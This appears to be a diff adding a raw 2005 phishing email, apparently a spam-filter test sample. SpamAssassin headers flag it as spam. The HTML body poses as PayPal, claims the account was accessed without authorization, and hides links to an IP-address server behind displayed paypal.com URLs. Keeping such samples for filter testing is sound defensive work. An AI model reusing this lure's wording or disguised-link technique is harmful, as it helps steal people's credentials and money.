@@ -1,0 +1,78 @@
+From nobody Sun Jan 25 13:48:12 2015
+Return-Path: <service@paypal.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP
+ id B9CD5537059; Thu, 29 Dec 2005 03:15:35 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+ by mail2.example.com (Postfix) with ESMTP id 3F2196FA4BE;
+ Thu, 29 Dec 2005 03:15:32 -0500 (EST)
+Received: from mail.com (h-66-166-90-124.mclnva23.covad.net [66.166.90.124])
+ by mail2.example.com (Postfix) with SMTP;
+ Thu, 29 Dec 2005 03:15:32 -0500 (EST)
+Reply-To: <service@paypal.com>
+From: "PayPal" <service@paypal.com>
+Subject: Check the status and history of your account
+Date: Thu, 29 Dec 2005 03:16:45 -0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: *************
+X-Spam-Status: Yes, score=13.3 required=5.0 tests=FAKE_HELO_MAIL_COM_DOM,
+ FORGED_MUA_OUTLOOK,FORGED_OUTLOOK_HTML,FORGED_OUTLOOK_TAGS,HTML_20_30,
+ HTML_MESSAGE,HTML_TITLE_EMPTY,MIME_HTML_ONLY,MISSING_HEADERS,
+ NORMAL_HTTP_TO_IP,RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK,
+ RCVD_IN_BL_SPAMCOP_NET,RCVD_IN_XBL,WEIRD_PORT autolearn=spam 
+ version=3.0.2
+X-Spam-Report: * 2.1 FAKE_HELO_MAIL_COM_DOM Relay HELO'd with suspicious
+ hostname (mail.com) *  0.1 MISSING_HEADERS Missing To: header
+ *  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+ *  0.1 WEIRD_PORT URI: Uses non-standard port number for HTTP
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.2 HTML_20_30 BODY: Message is 20% to 30% HTML
+ *  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+ *      [cf: 100]
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  0.0 HTML_TITLE_EMPTY BODY: HTML title contains no text
+ *  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+ *  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+ *      [Blocked - see <http://www.spamcop.net/bl.shtml?66.166.90.124>]
+ *  3.1 RCVD_IN_XBL RBL: Received via a relay in Spamhaus XBL
+ *      [66.166.90.124 listed in sbl-xbl.spamhaus.org]
+ *  0.6 FORGED_OUTLOOK_HTML Outlook can't send HTML message only
+ *  0.1 FORGED_OUTLOOK_TAGS Outlook can't send HTML in this format
+ *  3.9 FORGED_MUA_OUTLOOK Forged mail pretending to be from MS Outlook
+Message-Id: <20051229081532.3F2196FA4BE@mail2.example.com>
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 179
+
+<HTML>
+<HEAD>
+<TITLE></TITLE>
+</HEAD>
+<BODY>
+<P><FONT face="MS Sans Serif">As part of our security measures, we regularly screen activity in the<BR>Pay Pal system. We recently noticed that your account was accessed by unauthorized third party. Because protecting the security of your account is our primary concern, we are forced to limit the access to sensitive Pay Pal account features. We realise that this may be an inconvenience but please understand that this temporary limitation is for your protection.<BR>Case ID Number: PP-042-818-072 </FONT></P>
+<P><A href="http://203.252.166.156:8000/alitza/index.php"><FONT 
+face="MS Sans Serif">https://www.paypal.com/us/cgi-bin/webscr?cmd=complaint-view</FONT></A></P>
+<P><FONT face="MS Sans Serif"></FONT></P>
+<FONT face="MS Sans Serif">Your Personal Data includes information that can identify you as a 
+specific individual, such as your name, address, phone number, credit card number or e-mail address
+are stored in your account. Is strongly recommend that you log into your account and verify your Personal Data. We apologize for any inconvenience this may cause.</FONT>
+<P><BR><FONT face="MS Sans Serif">To review your account and some or all of the 
+information that Pay Pal used to make its decision to limit your account access, please visit the Resolution Center 
+</FONT><A href="http://203.252.166.156:8000/alitza/primapagina.php"><FONT face="MS Sans Serif">https://www.paypal.com/</FONT></A><FONT face="MS Sans Serif"> . If, after reviewing your account information, you seekfurther clarification regarding your account access, please contact Pay Pal by visiting the Help Center and clicking "Contact Us". We thank you for your prompt attention to this matter. Please understand that this is a security measure intended to help and protect you and your account. We apologize for any inconvenience.</FONT></P>
+<P><FONT face="MS Sans Serif">Sincerely,<BR>Pay Pal Account Review Department</FONT></P>
+<P><FONT face="MS Sans Serif">Pay Pal Email ID PP520952</FONT></P>
+</BODY>
+</HTML>
